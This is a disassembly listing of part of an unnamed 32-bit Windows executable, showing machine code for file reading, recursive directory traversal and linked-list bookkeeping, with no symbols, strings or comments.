  403d5c:	8b ca                	mov    %edx,%ecx
  403d5e:	83 e1 03             	and    $0x3,%ecx
  403d61:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403d63:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403d67:	e8 34 22 00 00       	call   0x405fa0
  403d6c:	53                   	push   %ebx
  403d6d:	8b f0                	mov    %eax,%esi
  403d6f:	ff 15 24 b1 40 00    	call   *0x40b124
  403d75:	5d                   	pop    %ebp
  403d76:	8b c6                	mov    %esi,%eax
  403d78:	5f                   	pop    %edi
  403d79:	5e                   	pop    %esi
  403d7a:	5b                   	pop    %ebx
  403d7b:	83 c4 08             	add    $0x8,%esp
  403d7e:	c2 04 00             	ret    $0x4
  403d81:	90                   	nop
  403d82:	90                   	nop
  403d83:	90                   	nop
  403d84:	90                   	nop
  403d85:	90                   	nop
  403d86:	90                   	nop
  403d87:	90                   	nop
  403d88:	90                   	nop
  403d89:	90                   	nop
  403d8a:	90                   	nop
  403d8b:	90                   	nop
  403d8c:	90                   	nop
  403d8d:	90                   	nop
  403d8e:	90                   	nop
  403d8f:	90                   	nop
  403d90:	53                   	push   %ebx
  403d91:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  403d95:	55                   	push   %ebp
  403d96:	57                   	push   %edi
  403d97:	8b 43 04             	mov    0x4(%ebx),%eax
  403d9a:	8b e9                	mov    %ecx,%ebp
  403d9c:	83 f8 ff             	cmp    $0xffffffff,%eax
  403d9f:	75 0d                	jne    0x403dae
  403da1:	e8 ca 00 00 00       	call   0x403e70
  403da6:	5f                   	pop    %edi
  403da7:	5d                   	pop    %ebp
  403da8:	33 c0                	xor    %eax,%eax
  403daa:	5b                   	pop    %ebx
  403dab:	c2 04 00             	ret    $0x4
  403dae:	6a 00                	push   $0x0
  403db0:	68 80 00 00 00       	push   $0x80
  403db5:	6a 03                	push   $0x3
  403db7:	6a 00                	push   $0x0
  403db9:	6a 01                	push   $0x1
  403dbb:	8d 45 20             	lea    0x20(%ebp),%eax
  403dbe:	68 00 00 00 80       	push   $0x80000000
  403dc3:	50                   	push   %eax
  403dc4:	ff 15 40 b1 40 00    	call   *0x40b140
  403dca:	8b f8                	mov    %eax,%edi
  403dcc:	83 ff ff             	cmp    $0xffffffff,%edi
  403dcf:	75 08                	jne    0x403dd9
  403dd1:	5f                   	pop    %edi
  403dd2:	5d                   	pop    %ebp
  403dd3:	0b c0                	or     %eax,%eax
  403dd5:	5b                   	pop    %ebx
  403dd6:	c2 04 00             	ret    $0x4
  403dd9:	8b 4b 04             	mov    0x4(%ebx),%ecx
  403ddc:	56                   	push   %esi
  403ddd:	6a 00                	push   $0x0
  403ddf:	53                   	push   %ebx
  403de0:	51                   	push   %ecx
  403de1:	57                   	push   %edi
  403de2:	ff 15 48 b1 40 00    	call   *0x40b148
  403de8:	68 00 20 00 00       	push   $0x2000
  403ded:	6a 40                	push   $0x40
  403def:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403df6:	00 
  403df7:	ff 15 34 b1 40 00    	call   *0x40b134
  403dfd:	8b f0                	mov    %eax,%esi
  403dff:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403e03:	6a 00                	push   $0x0
  403e05:	51                   	push   %ecx
  403e06:	c6 06 6a             	movb   $0x6a,(%esi)
  403e09:	8b 13                	mov    (%ebx),%edx
  403e0b:	89 56 01             	mov    %edx,0x1(%esi)
  403e0e:	8b 43 04             	mov    0x4(%ebx),%eax
  403e11:	8d 56 09             	lea    0x9(%esi),%edx
  403e14:	68 f7 1f 00 00       	push   $0x1ff7
  403e19:	52                   	push   %edx
  403e1a:	57                   	push   %edi
  403e1b:	89 46 05             	mov    %eax,0x5(%esi)
  403e1e:	ff 15 44 b1 40 00    	call   *0x40b144
  403e24:	57                   	push   %edi
  403e25:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  403e2b:	8b 44 24 14          	mov    0x14(%esp),%eax
  403e2f:	85 c0                	test   %eax,%eax
  403e31:	76 1e                	jbe    0x403e51
  403e33:	83 c0 09             	add    $0x9,%eax
  403e36:	8b cd                	mov    %ebp,%ecx
  403e38:	50                   	push   %eax
  403e39:	56                   	push   %esi
  403e3a:	e8 61 21 00 00       	call   0x405fa0
  403e3f:	56                   	push   %esi
  403e40:	8b f8                	mov    %eax,%edi
  403e42:	ff 15 24 b1 40 00    	call   *0x40b124
  403e48:	8b c7                	mov    %edi,%eax
  403e4a:	5e                   	pop    %esi
  403e4b:	5f                   	pop    %edi
  403e4c:	5d                   	pop    %ebp
  403e4d:	5b                   	pop    %ebx
  403e4e:	c2 04 00             	ret    $0x4
  403e51:	8b cd                	mov    %ebp,%ecx
  403e53:	e8 18 00 00 00       	call   0x403e70
  403e58:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403e5c:	56                   	push   %esi
  403e5d:	ff 15 24 b1 40 00    	call   *0x40b124
  403e63:	8b c7                	mov    %edi,%eax
  403e65:	5e                   	pop    %esi
  403e66:	5f                   	pop    %edi
  403e67:	5d                   	pop    %ebp
  403e68:	5b                   	pop    %ebx
  403e69:	c2 04 00             	ret    $0x4
  403e6c:	90                   	nop
  403e6d:	90                   	nop
  403e6e:	90                   	nop
  403e6f:	90                   	nop
  403e70:	56                   	push   %esi
  403e71:	57                   	push   %edi
  403e72:	8b f9                	mov    %ecx,%edi
  403e74:	6a 01                	push   $0x1
  403e76:	8b 47 14             	mov    0x14(%edi),%eax
  403e79:	8b 30                	mov    (%eax),%esi
  403e7b:	8b 4e 04             	mov    0x4(%esi),%ecx
  403e7e:	8b 16                	mov    (%esi),%edx
  403e80:	89 11                	mov    %edx,(%ecx)
  403e82:	8b 06                	mov    (%esi),%eax
  403e84:	8b 4e 04             	mov    0x4(%esi),%ecx
  403e87:	89 48 04             	mov    %ecx,0x4(%eax)
  403e8a:	8d 4e 08             	lea    0x8(%esi),%ecx
  403e8d:	ff 15 2c b2 40 00    	call   *0x40b22c
  403e93:	56                   	push   %esi
  403e94:	e8 4d 68 00 00       	call   0x40a6e6
  403e99:	8b 4f 18             	mov    0x18(%edi),%ecx
  403e9c:	83 c4 04             	add    $0x4,%esp
  403e9f:	49                   	dec    %ecx
  403ea0:	8b c1                	mov    %ecx,%eax
  403ea2:	89 4f 18             	mov    %ecx,0x18(%edi)
  403ea5:	85 c0                	test   %eax,%eax
  403ea7:	75 0c                	jne    0x403eb5
  403ea9:	6a 6b                	push   $0x6b
  403eab:	8b cf                	mov    %edi,%ecx
  403ead:	e8 2e 00 00 00       	call   0x403ee0
  403eb2:	5f                   	pop    %edi
  403eb3:	5e                   	pop    %esi
  403eb4:	c3                   	ret
  403eb5:	8b 57 14             	mov    0x14(%edi),%edx
  403eb8:	8b 02                	mov    (%edx),%eax
  403eba:	8b 40 0c             	mov    0xc(%eax),%eax
  403ebd:	85 c0                	test   %eax,%eax
  403ebf:	75 05                	jne    0x403ec6
  403ec1:	a1 28 b2 40 00       	mov    0x40b228,%eax
  403ec6:	50                   	push   %eax
  403ec7:	8b cf                	mov    %edi,%ecx
  403ec9:	e8 c2 fd ff ff       	call   0x403c90
  403ece:	5f                   	pop    %edi
  403ecf:	5e                   	pop    %esi
  403ed0:	c3                   	ret
  403ed1:	90                   	nop
  403ed2:	90                   	nop
  403ed3:	90                   	nop
  403ed4:	90                   	nop
  403ed5:	90                   	nop
  403ed6:	90                   	nop
  403ed7:	90                   	nop
  403ed8:	90                   	nop
  403ed9:	90                   	nop
  403eda:	90                   	nop
  403edb:	90                   	nop
  403edc:	90                   	nop
  403edd:	90                   	nop
  403ede:	90                   	nop
  403edf:	90                   	nop
  403ee0:	8d 44 24 04          	lea    0x4(%esp),%eax
  403ee4:	6a 01                	push   $0x1
  403ee6:	50                   	push   %eax
  403ee7:	e8 b4 20 00 00       	call   0x405fa0
  403eec:	c2 04 00             	ret    $0x4
  403eef:	90                   	nop
  403ef0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403ef6:	6a ff                	push   $0xffffffff
  403ef8:	68 d9 aa 40 00       	push   $0x40aad9
  403efd:	50                   	push   %eax
  403efe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403f05:	83 ec 10             	sub    $0x10,%esp
  403f08:	53                   	push   %ebx
  403f09:	55                   	push   %ebp
  403f0a:	56                   	push   %esi
  403f0b:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  403f0f:	8b e9                	mov    %ecx,%ebp
  403f11:	56                   	push   %esi
  403f12:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  403f18:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%eax,%esi,1)
  403f1d:	75 21                	jne    0x403f40
  403f1f:	56                   	push   %esi
  403f20:	8b cd                	mov    %ebp,%ecx
  403f22:	e8 e9 00 00 00       	call   0x404010
  403f27:	8b 45 18             	mov    0x18(%ebp),%eax
  403f2a:	33 db                	xor    %ebx,%ebx
  403f2c:	3b c3                	cmp    %ebx,%eax
  403f2e:	0f 85 ab 00 00 00    	jne    0x403fdf
  403f34:	8b cd                	mov    %ebp,%ecx
  403f36:	e8 05 03 00 00       	call   0x404240
  403f3b:	e9 b8 00 00 00       	jmp    0x403ff8
  403f40:	8a 44 24 2c          	mov    0x2c(%esp),%al
  403f44:	57                   	push   %edi
  403f45:	88 44 24 10          	mov    %al,0x10(%esp)
  403f49:	8b fe                	mov    %esi,%edi
  403f4b:	83 c9 ff             	or     $0xffffffff,%ecx
  403f4e:	33 c0                	xor    %eax,%eax
  403f50:	33 db                	xor    %ebx,%ebx
  403f52:	f2 ae                	repnz scas %es:(%edi),%al
  403f54:	f7 d1                	not    %ecx
  403f56:	49                   	dec    %ecx
  403f57:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  403f5b:	51                   	push   %ecx
  403f5c:	56                   	push   %esi
  403f5d:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  403f61:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403f65:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  403f69:	ff 15 20 b2 40 00    	call   *0x40b220
  403f6f:	8b 7d 14             	mov    0x14(%ebp),%edi
  403f72:	8d 75 10             	lea    0x10(%ebp),%esi
  403f75:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  403f79:	8b 4f 04             	mov    0x4(%edi),%ecx
  403f7c:	51                   	push   %ecx
  403f7d:	57                   	push   %edi
  403f7e:	8b ce                	mov    %esi,%ecx
  403f80:	e8 cb 06 00 00       	call   0x404650
  403f85:	89 47 04             	mov    %eax,0x4(%edi)
  403f88:	8b 48 04             	mov    0x4(%eax),%ecx
  403f8b:	8d 54 24 10          	lea    0x10(%esp),%edx
  403f8f:	89 01                	mov    %eax,(%ecx)
  403f91:	83 c0 08             	add    $0x8,%eax
  403f94:	52                   	push   %edx
  403f95:	50                   	push   %eax
  403f96:	e8 05 07 00 00       	call   0x4046a0
  403f9b:	8b 56 08             	mov    0x8(%esi),%edx
  403f9e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403fa2:	83 c4 08             	add    $0x8,%esp
  403fa5:	42                   	inc    %edx
  403fa6:	3b c3                	cmp    %ebx,%eax
  403fa8:	89 56 08             	mov    %edx,0x8(%esi)
  403fab:	c7 44 24 28 ff ff ff 	movl   $0xffffffff,0x28(%esp)
  403fb2:	ff 
  403fb3:	5f                   	pop    %edi
  403fb4:	74 1d                	je     0x403fd3
  403fb6:	8d 48 ff             	lea    -0x1(%eax),%ecx
  403fb9:	8a 40 ff             	mov    -0x1(%eax),%al
  403fbc:	3a c3                	cmp    %bl,%al
  403fbe:	74 0a                	je     0x403fca
  403fc0:	3c ff                	cmp    $0xff,%al
  403fc2:	74 06                	je     0x403fca
  403fc4:	fe c8                	dec    %al
  403fc6:	88 01                	mov    %al,(%ecx)
  403fc8:	eb 09                	jmp    0x403fd3
  403fca:	51                   	push   %ecx
  403fcb:	e8 16 67 00 00       	call   0x40a6e6
  403fd0:	83 c4 04             	add    $0x4,%esp
  403fd3:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403fd7:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  403fdb:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403fdf:	8b 45 14             	mov    0x14(%ebp),%eax
  403fe2:	8b 00                	mov    (%eax),%eax
  403fe4:	8b 40 0c             	mov    0xc(%eax),%eax
  403fe7:	3b c3                	cmp    %ebx,%eax
  403fe9:	75 05                	jne    0x403ff0
  403feb:	a1 28 b2 40 00       	mov    0x40b228,%eax
  403ff0:	50                   	push   %eax
  403ff1:	8b cd                	mov    %ebp,%ecx
  403ff3:	e8 98 fc ff ff       	call   0x403c90
  403ff8:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403ffc:	5e                   	pop    %esi
  403ffd:	5d                   	pop    %ebp
  403ffe:	b0 01                	mov    $0x1,%al
  404000:	5b                   	pop    %ebx
  404001:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404008:	83 c4 1c             	add    $0x1c,%esp
  40400b:	c2 04 00             	ret    $0x4
  40400e:	90                   	nop
  40400f:	90                   	nop
  404010:	6a ff                	push   $0xffffffff
  404012:	68 fc aa 40 00       	push   $0x40aafc
  404017:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40401d:	50                   	push   %eax
  40401e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404025:	81 ec 6c 04 00 00    	sub    $0x46c,%esp
  40402b:	55                   	push   %ebp
  40402c:	56                   	push   %esi
  40402d:	8b b4 24 84 04 00 00 	mov    0x484(%esp),%esi
  404034:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  404038:	57                   	push   %edi
  404039:	b9 41 00 00 00       	mov    $0x41,%ecx
  40403e:	33 c0                	xor    %eax,%eax
  404040:	8d bc 24 70 02 00 00 	lea    0x270(%esp),%edi
  404047:	f3 ab                	rep stos %eax,%es:(%edi)
  404049:	56                   	push   %esi
  40404a:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  404050:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%eax,%esi,1)
  404055:	74 0b                	je     0x404062
  404057:	bf c0 e1 40 00       	mov    $0x40e1c0,%edi
  40405c:	89 7c 24 14          	mov    %edi,0x14(%esp)
  404060:	eb 0c                	jmp    0x40406e
  404062:	c7 44 24 14 28 e7 40 	movl   $0x40e728,0x14(%esp)
  404069:	00 
  40406a:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40406e:	8b 2d 78 b3 40 00    	mov    0x40b378,%ebp
  404074:	57                   	push   %edi
  404075:	56                   	push   %esi
  404076:	8d 84 24 78 02 00 00 	lea    0x278(%esp),%eax
  40407d:	68 b8 e1 40 00       	push   $0x40e1b8
  404082:	50                   	push   %eax
  404083:	ff d5                	call   *%ebp
  404085:	83 c4 10             	add    $0x10,%esp
  404088:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  40408c:	8d 94 24 70 02 00 00 	lea    0x270(%esp),%edx
  404093:	51                   	push   %ecx
  404094:	52                   	push   %edx
  404095:	ff 15 30 b1 40 00    	call   *0x40b130
  40409b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40409e:	89 44 24 28          	mov    %eax,0x28(%esp)
  4040a2:	75 07                	jne    0x4040ab
  4040a4:	32 c0                	xor    %al,%al
  4040a6:	e9 76 01 00 00       	jmp    0x404221
  4040ab:	53                   	push   %ebx
  4040ac:	33 db                	xor    %ebx,%ebx
  4040ae:	80 7c 24 5c 2e       	cmpb   $0x2e,0x5c(%esp)
  4040b3:	0f 84 42 01 00 00    	je     0x4041fb
  4040b9:	f6 44 24 30 10       	testb  $0x10,0x30(%esp)
  4040be:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  4040c2:	50                   	push   %eax
  4040c3:	57                   	push   %edi
  4040c4:	56                   	push   %esi
  4040c5:	68 b0 e1 40 00       	push   $0x40e1b0
  4040ca:	74 23                	je     0x4040ef
  4040cc:	8d 8c 24 88 03 00 00 	lea    0x388(%esp),%ecx
  4040d3:	51                   	push   %ecx
  4040d4:	ff d5                	call   *%ebp
  4040d6:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4040da:	83 c4 14             	add    $0x14,%esp
  4040dd:	8d 94 24 78 03 00 00 	lea    0x378(%esp),%edx
  4040e4:	52                   	push   %edx
  4040e5:	e8 26 ff ff ff       	call   0x404010
  4040ea:	e9 0c 01 00 00       	jmp    0x4041fb
  4040ef:	8d 8c 24 80 01 00 00 	lea    0x180(%esp),%ecx
  4040f6:	51                   	push   %ecx
  4040f7:	ff d5                	call   *%ebp
  4040f9:	8d bc 24 84 01 00 00 	lea    0x184(%esp),%edi
  404100:	83 c9 ff             	or     $0xffffffff,%ecx
  404103:	33 c0                	xor    %eax,%eax
  404105:	83 c4 14             	add    $0x14,%esp
  404108:	f2 ae                	repnz scas %es:(%edi),%al
  40410a:	8a 54 24 17          	mov    0x17(%esp),%dl
  40410e:	6a 01                	push   $0x1
  404110:	f7 d1                	not    %ecx
  404112:	49                   	dec    %ecx
  404113:	88 54 24 20          	mov    %dl,0x20(%esp)
  404117:	8b e9                	mov    %ecx,%ebp
  404119:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  40411d:	55                   	push   %ebp
  40411e:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  404122:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  404126:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  40412a:	ff 15 1c b2 40 00    	call   *0x40b21c
  404130:	84 c0                	test   %al,%al
  404132:	74 26                	je     0x40415a
  404134:	8b 7c 24 20          	mov    0x20(%esp),%edi
  404138:	8b cd                	mov    %ebp,%ecx
  40413a:	8b c1                	mov    %ecx,%eax
  40413c:	8d b4 24 70 01 00 00 	lea    0x170(%esp),%esi
  404143:	c1 e9 02             	shr    $0x2,%ecx
  404146:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404148:	8b c8                	mov    %eax,%ecx
  40414a:	83 e1 03             	and    $0x3,%ecx
  40414d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40414f:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  404153:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  404157:	88 1c 29             	mov    %bl,(%ecx,%ebp,1)
  40415a:	8b 54 24 10          	mov    0x10(%esp),%edx
  40415e:	6a 18                	push   $0x18
  404160:	89 9c 24 88 04 00 00 	mov    %ebx,0x488(%esp)
  404167:	8b 72 14             	mov    0x14(%edx),%esi
  40416a:	8b 7e 04             	mov    0x4(%esi),%edi
  40416d:	e8 6e 65 00 00       	call   0x40a6e0
  404172:	83 c4 04             	add    $0x4,%esp
  404175:	3b f3                	cmp    %ebx,%esi
  404177:	8b ce                	mov    %esi,%ecx
  404179:	75 02                	jne    0x40417d
  40417b:	8b c8                	mov    %eax,%ecx
  40417d:	89 08                	mov    %ecx,(%eax)
  40417f:	3b fb                	cmp    %ebx,%edi
  404181:	8b cf                	mov    %edi,%ecx
  404183:	75 02                	jne    0x404187
  404185:	8b c8                	mov    %eax,%ecx
  404187:	89 48 04             	mov    %ecx,0x4(%eax)
  40418a:	89 46 04             	mov    %eax,0x4(%esi)
  40418d:	8b 48 04             	mov    0x4(%eax),%ecx
  404190:	89 01                	mov    %eax,(%ecx)
  404192:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  404196:	83 c0 08             	add    $0x8,%eax
  404199:	51                   	push   %ecx
  40419a:	50                   	push   %eax
  40419b:	e8 00 05 00 00       	call   0x4046a0
  4041a0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4041a4:	83 c4 08             	add    $0x8,%esp
  4041a7:	c7 84 24 84 04 00 00 	movl   $0xffffffff,0x484(%esp)
  4041ae:	ff ff ff ff 
  4041b2:	8b 50 18             	mov    0x18(%eax),%edx
  4041b5:	42                   	inc    %edx
  4041b6:	89 50 18             	mov    %edx,0x18(%eax)
  4041b9:	8b 44 24 20          	mov    0x20(%esp),%eax
  4041bd:	3b c3                	cmp    %ebx,%eax
  4041bf:	74 1d                	je     0x4041de
  4041c1:	8d 48 ff             	lea    -0x1(%eax),%ecx
  4041c4:	8a 40 ff             	mov    -0x1(%eax),%al
  4041c7:	3a c3                	cmp    %bl,%al
  4041c9:	74 0a                	je     0x4041d5
  4041cb:	3c ff                	cmp    $0xff,%al
  4041cd:	74 06                	je     0x4041d5
  4041cf:	fe c8                	dec    %al
  4041d1:	88 01                	mov    %al,(%ecx)
  4041d3:	eb 09                	jmp    0x4041de
  4041d5:	51                   	push   %ecx
  4041d6:	e8 0b 65 00 00       	call   0x40a6e6
  4041db:	83 c4 04             	add    $0x4,%esp
  4041de:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4041e2:	8b b4 24 8c 04 00 00 	mov    0x48c(%esp),%esi
  4041e9:	8b 2d 78 b3 40 00    	mov    0x40b378,%ebp
  4041ef:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4041f3:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  4041f7:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  4041fb:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4041ff:	8d 54 24 30          	lea    0x30(%esp),%edx
  404203:	52                   	push   %edx
  404204:	50                   	push   %eax
  404205:	ff 15 28 b1 40 00    	call   *0x40b128
  40420b:	85 c0                	test   %eax,%eax
  40420d:	0f 85 9b fe ff ff    	jne    0x4040ae
  404213:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404217:	51                   	push   %ecx
  404218:	ff 15 20 b1 40 00    	call   *0x40b120
  40421e:	b0 01                	mov    $0x1,%al
  404220:	5b                   	pop    %ebx
  404221:	8b 8c 24 78 04 00 00 	mov    0x478(%esp),%ecx
  404228:	5f                   	pop    %edi
  404229:	5e                   	pop    %esi
  40422a:	5d                   	pop    %ebp
  40422b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404232:	81 c4 78 04 00 00    	add    $0x478,%esp
  404238:	c2 04 00             	ret    $0x4
  40423b:	90                   	nop
  40423c:	90                   	nop
  40423d:	90                   	nop
  40423e:	90                   	nop
  40423f:	90                   	nop
  404240:	51                   	push   %ecx
  404241:	53                   	push   %ebx
  404242:	8b d9                	mov    %ecx,%ebx
  404244:	55                   	push   %ebp
  404245:	8b 43 18             	mov    0x18(%ebx),%eax
  404248:	85 c0                	test   %eax,%eax
  40424a:	0f 84 9c 00 00 00    	je     0x4042ec
  404250:	8b 43 14             	mov    0x14(%ebx),%eax
  404253:	89 44 24 08          	mov    %eax,0x8(%esp)
  404257:	8b 28                	mov    (%eax),%ebp
  404259:	3b e8                	cmp    %eax,%ebp
  40425b:	0f 84 8b 00 00 00    	je     0x4042ec
  404261:	56                   	push   %esi
  404262:	57                   	push   %edi
  404263:	8b fd                	mov    %ebp,%edi
  404265:	8b 6d 00             	mov    0x0(%ebp),%ebp
  404268:	8b 47 04             	mov    0x4(%edi),%eax
  40426b:	8b 0f                	mov    (%edi),%ecx
  40426d:	8d 77 08             	lea    0x8(%edi),%esi
  404270:	89 08                	mov    %ecx,(%eax)
  404272:	8b 17                	mov    (%edi),%edx
  404274:	8b 47 04             	mov    0x4(%edi),%eax
  404277:	89 42 04             	mov    %eax,0x4(%edx)
  40427a:	8b 46 04             	mov    0x4(%esi),%eax
  40427d:	85 c0                	test   %eax,%eax
  40427f:	74 42                	je     0x4042c3
  404281:	50                   	push   %eax
  404282:	8b ce                	mov    %esi,%ecx
  404284:	ff 15 18 b2 40 00    	call   *0x40b218
  40428a:	80 38 00             	cmpb   $0x0,(%eax)
  40428d:	74 21                	je     0x4042b0
  40428f:	8b 4e 04             	mov    0x4(%esi),%ecx
  404292:	51                   	push   %ecx
  404293:	8b ce                	mov    %esi,%ecx
  404295:	ff 15 18 b2 40 00    	call   *0x40b218
  40429b:	80 38 ff             	cmpb   $0xff,(%eax)
  40429e:	74 10                	je     0x4042b0
  4042a0:	8b 56 04             	mov    0x4(%esi),%edx
  4042a3:	8b ce                	mov    %esi,%ecx
  4042a5:	52                   	push   %edx
  4042a6:	ff 15 18 b2 40 00    	call   *0x40b218
  4042ac:	fe 08                	decb   (%eax)
  4042ae:	eb 13                	jmp    0x4042c3
  4042b0:	8b 46 0c             	mov    0xc(%esi),%eax
  4042b3:	8b 4e 04             	mov    0x4(%esi),%ecx
  4042b6:	83 c0 02             	add    $0x2,%eax
  4042b9:	49                   	dec    %ecx
  4042ba:	50                   	push   %eax
  4042bb:	51                   	push   %ecx
  4042bc:	8b ce                	mov    %esi,%ecx
  4042be:	e8 cd 03 00 00       	call   0x404690
  4042c3:	33 c0                	xor    %eax,%eax
  4042c5:	57                   	push   %edi
  4042c6:	89 46 04             	mov    %eax,0x4(%esi)
  4042c9:	89 46 08             	mov    %eax,0x8(%esi)
  4042cc:	89 46 0c             	mov    %eax,0xc(%esi)
  4042cf:	e8 12 64 00 00       	call   0x40a6e6
  4042d4:	8b 4b 18             	mov    0x18(%ebx),%ecx
  4042d7:	8b 44 24 14          	mov    0x14(%esp),%eax
  4042db:	83 c4 04             	add    $0x4,%esp
  4042de:	49                   	dec    %ecx
  4042df:	3b e8                	cmp    %eax,%ebp
  4042e1:	89 4b 18             	mov    %ecx,0x18(%ebx)
  4042e4:	0f 85 79 ff ff ff    	jne    0x404263
  4042ea:	5f                   	pop    %edi
  4042eb:	5e                   	pop    %esi
  4042ec:	6a 6b                	push   $0x6b
  4042ee:	8b cb                	mov    %ebx,%ecx
  4042f0:	e8 eb fb ff ff       	call   0x403ee0
  4042f5:	5d                   	pop    %ebp
  4042f6:	5b                   	pop    %ebx
  4042f7:	59                   	pop    %ecx
  4042f8:	c3                   	ret
  4042f9:	90                   	nop
  4042fa:	90                   	nop
  4042fb:	90                   	nop
  4042fc:	90                   	nop
  4042fd:	90                   	nop
  4042fe:	90                   	nop
  4042ff:	90                   	nop
  404300:	81 ec 40 01 00 00    	sub    $0x140,%esp
  404306:	8b 94 24 44 01 00 00 	mov    0x144(%esp),%edx
  40430d:	33 c0                	xor    %eax,%eax
  40430f:	53                   	push   %ebx
  404310:	8b d9                	mov    %ecx,%ebx
  404312:	55                   	push   %ebp
  404313:	56                   	push   %esi
  404314:	8d 6b 20             	lea    0x20(%ebx),%ebp
  404317:	57                   	push   %edi
  404318:	b9 41 00 00 00       	mov    $0x41,%ecx
  40431d:	8b fd                	mov    %ebp,%edi
  40431f:	f3 ab                	rep stos %eax,%es:(%edi)
  404321:	8d 7a 08             	lea    0x8(%edx),%edi
  404324:	83 c9 ff             	or     $0xffffffff,%ecx
  404327:	f2 ae                	repnz scas %es:(%edi),%al
  404329:	f7 d1                	not    %ecx
  40432b:	2b f9                	sub    %ecx,%edi
  40432d:	55                   	push   %ebp
  40432e:	8b c1                	mov    %ecx,%eax
  404330:	8b f7                	mov    %edi,%esi
  404332:	8b fd                	mov    %ebp,%edi
  404334:	c1 e9 02             	shr    $0x2,%ecx
  404337:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404339:	8b c8                	mov    %eax,%ecx
  40433b:	83 e1 03             	and    $0x3,%ecx
  40433e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404340:	8b 4a 04             	mov    0x4(%edx),%ecx
  404343:	89 8b 28 01 00 00    	mov    %ecx,0x128(%ebx)
  404349:	8b cb                	mov    %ebx,%ecx
  40434b:	c7 83 2c 01 00 00 00 	movl   $0x0,0x12c(%ebx)
  404352:	00 00 00 
  404355:	e8 66 f1 ff ff       	call   0x4034c0
  40435a:	8d 54 24 10          	lea    0x10(%esp),%edx
  40435e:	52                   	push   %edx
  40435f:	55                   	push   %ebp
  404360:	ff 15 30 b1 40 00    	call   *0x40b130
  404366:	8b f0                	mov    %eax,%esi
  404368:	83 fe ff             	cmp    $0xffffffff,%esi
  40436b:	74 2f                	je     0x40439c
  40436d:	8b 43 1c             	mov    0x1c(%ebx),%eax
  404370:	83 f8 04             	cmp    $0x4,%eax
  404373:	74 27                	je     0x40439c
  404375:	83 f8 02             	cmp    $0x2,%eax
  404378:	74 22                	je     0x40439c
  40437a:	83 f8 06             	cmp    $0x6,%eax
  40437d:	74 1d                	je     0x40439c
  40437f:	6a 6d                	push   $0x6d
  404381:	8b cb                	mov    %ebx,%ecx
  404383:	e8 58 fb ff ff       	call   0x403ee0
  404388:	56                   	push   %esi
  404389:	ff 15 20 b1 40 00    	call   *0x40b120
  40438f:	5f                   	pop    %edi
  404390:	5e                   	pop    %esi
  404391:	5d                   	pop    %ebp
  404392:	5b                   	pop    %ebx
  404393:	81 c4 40 01 00 00    	add    $0x140,%esp
  404399:	c2 04 00             	ret    $0x4
  40439c:	8b cb                	mov    %ebx,%ecx
  40439e:	e8 1d 00 00 00       	call   0x4043c0
  4043a3:	56                   	push   %esi
  4043a4:	ff 15 20 b1 40 00    	call   *0x40b120
  4043aa:	5f                   	pop    %edi
  4043ab:	5e                   	pop    %esi
  4043ac:	5d                   	pop    %ebp
  4043ad:	5b                   	pop    %ebx
  4043ae:	81 c4 40 01 00 00    	add    $0x140,%esp
  4043b4:	c2 04 00             	ret    $0x4
  4043b7:	90                   	nop
  4043b8:	90                   	nop
  4043b9:	90                   	nop
  4043ba:	90                   	nop
  4043bb:	90                   	nop
  4043bc:	90                   	nop
  4043bd:	90                   	nop
  4043be:	90                   	nop
  4043bf:	90                   	nop
  4043c0:	81 ec 50 01 00 00    	sub    $0x150,%esp
  4043c6:	53                   	push   %ebx
  4043c7:	8b d9                	mov    %ecx,%ebx
  4043c9:	56                   	push   %esi
  4043ca:	8b 4b 1c             	mov    0x1c(%ebx),%ecx
  4043cd:	8b c1                	mov    %ecx,%eax
